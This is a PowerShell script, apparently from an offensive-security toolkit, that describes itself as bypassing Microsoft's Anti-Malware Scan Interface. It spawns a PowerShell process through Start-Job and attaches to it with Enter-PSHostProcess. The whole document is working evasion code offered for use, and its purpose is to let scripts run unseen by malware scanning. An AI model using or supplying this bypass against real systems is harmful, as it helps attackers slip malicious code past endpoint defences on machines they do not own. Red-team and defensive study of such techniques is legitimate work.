<#

.SYNOPSIS 
	
	In the spirit of the KISS Principle (https://en.wikipedia.org/wiki/KISS_principle)
	
	Bypasses Microsoft's Anti-Malware Scan Interface for a PowerShell session process started through the "Start-Job" cmdlet, the PID of which is accessed using "Enter-PSHostProcess".
	
.EXAMPLE

	PS> .\Bypass-AMSI9000.ps1

.NOTES

	Author: Fabrizio Siciliano (@0rbz_)
	
#>
	
if ($PSVersionTable.PSVersion.Major -eq "2") {
	Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
	return
}

$JobName = (New-Guid).Guid

Try {
		
	Start-Job -Name $JobName -ScriptBlock {(Start-Process -NoNewWindow powershell)} | Out-Null
		
	Write-Output "Working..."
	sleep 2
}
Catch {
	Write-Output "Unknown Error."
}

$Process = (Get-Process powershell).Id
foreach ($i in $Process) {
	
	Try {
		Enter-PSHostProcess -Id $i
		Write-Output "Success."
		return
	}
	Catch {
		Write-Output "Bad PID...Trying again..."
		Sleep 2
	}
}